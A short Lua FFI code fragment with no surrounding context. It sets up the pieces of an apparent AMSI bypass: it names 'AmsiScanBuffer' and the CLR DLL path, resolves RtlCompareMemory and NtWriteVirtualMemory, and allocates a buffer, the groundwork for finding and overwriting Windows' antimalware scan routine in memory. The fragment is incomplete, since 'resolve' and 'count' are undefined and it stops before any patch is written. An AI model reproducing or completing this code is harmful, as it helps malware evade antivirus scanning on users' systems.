local ffi = require("ffi")
local clr = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll"
local api = "AmsiScanBuffer"
local cmp = resolve("RtlCompareMemory")
local write = resolve("NtWriteVirtualMemory")
local buffer = ffi.new("BYTE[?]", count)

